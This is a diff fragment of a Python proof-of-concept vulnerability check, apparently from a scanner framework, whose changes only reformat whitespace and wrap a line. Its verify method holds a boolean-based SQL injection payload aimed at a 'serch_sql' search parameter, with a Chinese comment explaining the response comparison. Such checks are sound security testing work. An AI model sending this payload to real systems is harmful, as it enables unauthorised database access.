@@ -39,9 +39,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             # 布尔类型注入,构造错误,判断页面两次返回是否正常
             payloadtrue = '''?serch_sql=%20123qwe%20where%201234%3D1234%20--%20x&imgproduct=xxxx'''
